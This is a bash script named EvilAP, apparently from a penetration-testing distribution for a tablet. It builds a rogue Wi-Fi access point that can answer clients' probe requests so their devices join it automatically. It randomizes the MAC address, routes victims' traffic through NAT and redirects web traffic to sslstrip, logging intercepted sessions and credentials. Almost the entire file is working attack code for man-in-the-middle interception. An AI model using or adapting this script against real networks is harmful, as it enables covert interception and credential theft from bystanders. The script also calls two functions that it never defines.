#!/bin/bash
#Date: March 2013
#Desc: EvilAP script to forcefully connect wireless clients
#Authors: Awk, Sedd, Pasties
#Company: Pwnie Express
#Version: 1.0
#Adapted for Kali Pwnpad

##################################################
f_restore_ident(){
  ifconfig wlan1 down
  macchanger -p wlan1
}

trap f_endclean INT
trap f_endclean KILL

##################################################
f_clean_up() {
  echo
  echo "Killing any previous instances of airbase or dhcpd"
  echo
pkill airbase-ng 
pkill dhcpd
service dnsmasq stop
ifconfig at0 down
airmon-ng stop mon0
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
}

##################################################
f_endclean(){
  f_clean_up
  f_restore_ident
  exit
}

##################################################
f_interface(){
  clear

    echo "		Welcome to the EvilAP" 
    echo
    echo "Select which interface you are using for Internet? (1-3):"
    echo
    echo "1. [rmnet0] (3G GSM connection)"
    echo "2. eth0  (USB ethernet adapter)"
    echo "3. wlan0  (Internal Nexus Wifi)"
    echo

    read -p "Choice: " interfacechoice

  case $interfacechoice in
    1) f_rmnet0 ;;
    2) f_eth0 ;;
    3) f_wlan0 ;;
    *) f_rmnet0 ;;
  esac
}

#########################################
f_rmnet0(){
  interface=rmnet0
}


#########################################
f_eth0(){
  interface=eth0
}

#########################################
f_wlan0(){
  interface=wlan0
}

#########################################
f_ssid(){
  clear
  echo
  read -p "Enter an SSID name [attwifi]: " ssid
  echo

  if [ -z $ssid ]
  then
    ssid=attwifi
  fi
}

#########################################
f_preplaunch(){
  #Change the hostname and mac address randomly

  ifconfig wlan1 down

  macchanger -r wlan1

  echo "Rolling MAC address and Hostname randomly:"
  echo

  hn=`ifconfig wlan1 |grep HWaddr |awk '{print$5}' |awk -F":" '{print$1$2$3$4$5$6}'`
  hostname $hn

  echo $hn

  sleep 2

  echo 

  #Put wlan1 into monitor mode - mon0 created
  airmon-ng start wlan1
}
#########################################
f_evilap(){
  #Log path and name
  logname="/opt/pwnpad/captures/evilap/evilap-$(date +%s).log"
  sslstripfilename="/opt/pwnpad/captures/sslstrip/sslstrip$(date +%F-%H%M).log"
  DEFS="/opt/pwnpad/easy-creds/definitions.sslstrip"

  #Start Airbase-ng with -P for preferred networks 
  airbase-ng -P -C 30 -c 3 -e "$ssid" -v mon0 > $logname 2>&1 & 
  sleep 2

  #Bring up virtual interface at0
  ifconfig at0 up
  ifconfig at0 10.0.0.1 netmask 255.255.255.0

  #Start DHCP server on at0
  service dnsmasq start

  #IP forwarding and iptables routing using internet connection
  echo 1 > /proc/sys/net/ipv4/ip_forward
  iptables --table nat --append POSTROUTING --out-interface $interface -j MASQUERADE &&
  iptables --append FORWARD --in-interface at0 -j ACCEPT &&
  
  echo "Redirecting port 80 to 1000 SSLStrip interception"
  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

  echo "Running sslstrip and saving output to "
  cd /opt/pwnpad/sslstrip
  python sslstrip.py -a -l 10000 -w $sslstripfilename & tail -f $logname
}

#########################################
f_niceap(){
  #Log path and name
  logname="/opt/pwnpad/captures/evilap/evilap-$(date +%s).log"
  sslstripfilename="/opt/pwnpad/captures/sslstrip/sslstrip$(date +%F-%H%M).log"
  DEFS="/opt/pwnpad/easy-creds/definitions.sslstrip"

  #Start Airbase-ng with -P for preferred networks 
  airbase-ng -C 30 -c 3 -e "$ssid" -v mon0 > $logname 2>&1 &
  sleep 2

  #Bring up virtual interface at0
  ifconfig at0 up
  ifconfig at0 10.0.0.1 netmask 255.255.255.0

  #Start DHCP server on at0
  service dnsmasq start

  #IP forwarding and iptables routing using internet connection
  echo 1 > /proc/sys/net/ipv4/ip_forward
  iptables --table nat --append POSTROUTING --out-interface $interface -j MASQUERADE &&
  iptables --append FORWARD --in-interface at0 -j ACCEPT &&
  
  echo "Redirecting port 80 to 1000 SSLStrip interception"
  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 
  echo "Running sslstrip and saving output to "
  cd /opt/pwnpad/sslstrip
  python sslstrip.py -a -l 10000 -w $sslstripfilename & tail -f $logname
}

#########################################
f_karmaornot(){

  clear
  echo
  echo "Force clients to connect based on their probe requests? [default yes]: "
  echo
  echo "WARNING: Everything will start connecting to you if yes is selected"
  echo
  echo "1. Yes"
  echo "2. No"
  echo
  read -p "Choice: " karma

}

#########################################
f_run(){
  f_modprobe
  f_getmacaddress
  f_clean_up
  f_interface
  f_ssid
  f_karmaornot
  f_preplaunch
  if [ -z $karma ]
  then
    karma="1"
  fi

  if [ $karma -eq 1 ]
  then
  f_evilap
  else
  f_niceap
  fi
}
f_run
